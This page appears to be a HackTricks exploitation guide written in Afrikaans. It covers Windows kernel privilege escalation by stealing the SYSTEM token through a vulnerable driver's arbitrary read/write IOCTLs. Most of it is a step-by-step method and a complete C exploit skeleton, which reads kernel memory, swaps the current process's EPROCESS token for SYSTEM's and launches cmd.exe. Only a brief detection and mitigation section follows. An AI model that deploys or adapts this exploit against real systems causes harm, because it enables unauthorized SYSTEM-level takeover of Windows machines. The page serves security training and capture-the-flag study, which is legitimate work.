# Windows kernel EoP: Token stealing met arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

As 'n kwesbare driver 'n IOCTL blootstel wat 'n aanvaller arbitrary kernel read- en/of write-primitives gee, kan elevasie na NT AUTHORITY\SYSTEM dikwels bereik word deur 'n SYSTEM access token te steel. Die tegniek kopieer die Token-pointer vanaf 'n SYSTEM-process se EPROCESS na die huidige process se EPROCESS.<sup>[[2]](#references)</sup>

Waarom dit werk:
- Elke process het 'n EPROCESS-struktuur wat onder andere 'n Token bevat (eintlik 'n EX_FAST_REF na 'n token-object).
- Die SYSTEM-process (PID 4) hou 'n token met alle privileges enabled.
- Deur die huidige process se EPROCESS.Token met die SYSTEM-tokenpointer te vervang, loop die huidige process onmiddellik as SYSTEM.<sup>[[1]](#references)</sup>

> Offsets in EPROCESS verskil tussen Windows-weergawes. Bepaal hulle dinamies (symbols) of gebruik weergawespesifieke constants. Onthou ook dat EPROCESS.Token 'n EX_FAST_REF is (die lae 3 bits is reference count flags).

## Hoëvlak-stappe

1) Locate ntoskrnl.exe base en resolve die address van PsInitialSystemProcess.
- Gebruik vanuit user mode NtQuerySystemInformation(SystemModuleInformation) of EnumDeviceDrivers om loaded driver bases te kry.
- Voeg die offset van PsInitialSystemProcess (van symbols/reversing) by die kernel base om die address daarvan te kry.
2) Read die pointer by PsInitialSystemProcess → dit is 'n kernel pointer na SYSTEM se EPROCESS.
3) Lees vanuit SYSTEM EPROCESS die UniqueProcessId- en ActiveProcessLinks-offsets om deur die doubly linked list van EPROCESS-strukture te traverseer (ActiveProcessLinks.Flink/Blink) totdat jy die EPROCESS vind waarvan UniqueProcessId gelyk is aan GetCurrentProcessId(). Hou albei:
- EPROCESS_SYSTEM (vir SYSTEM)
- EPROCESS_SELF (vir die huidige process)
4) Lees SYSTEM se token value: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Mask out die lae 3 bits: Token_SYS_masked = Token_SYS & ~0xF (algemeen ~0xF of ~0x7, afhangend van die build; op x64 word die lae 3 bits gebruik — 0xFFFFFFFFFFFFFFF8-masker).
5) Option A (algemeen): Preserveer die lae 3 bits van jou huidige token en splice hulle op SYSTEM se pointer om die embedded ref count consistent te hou.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Write Token_NEW terug na (EPROCESS_SELF + TokenOffset) met jou kernel write-primitive.
7) Jou huidige process is nou SYSTEM. Spawn opsioneel 'n nuwe cmd.exe of powershell.exe om dit te bevestig.<sup>[[1]](#references)</sup>

## Pseudocode

Hieronder is 'n skeleton wat slegs twee IOCTLs van 'n kwesbare driver gebruik, een vir 8-byte kernel read en een vir 8-byte kernel write. Vervang dit met jou driver se interface.<sup>[[1]](#references)</sup>
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notas:
- Offsets: Gebruik WinDbg se `dt nt!_EPROCESS` met die teiken se PDBs, of ’n runtime-simboollaaier, om die korrekte offsets te verkry. Moenie dit blindelings hardcode nie.
- Masker: Op x64 is die token ’n EX_FAST_REF; die lae 3 bisse is verwysingtellerbisse. Deur die oorspronklike lae bisse van jou token te behou, vermy jy onmiddellike refcount-inkonsekwenthede.
- Stabiliteit: Verkieslik moet jy die huidige proses elevate; as jy ’n kortlewende helper elevate, kan jy SYSTEM verloor wanneer dit afsluit.<sup>[[1]](#references)</sup>

## Opsporing en versagting
- Die laai van unsigned of onbetroubare third-party drivers wat kragtige IOCTLs blootstel, is die hoofoorsaak.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard en Attack Surface Reduction-reëls kan voorkom dat kwesbare drivers laai.
- EDR kan verdagte IOCTL-sekwense dophou wat arbitrary read/write implementeer, asook token swaps.

## Verwysings

- [1] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
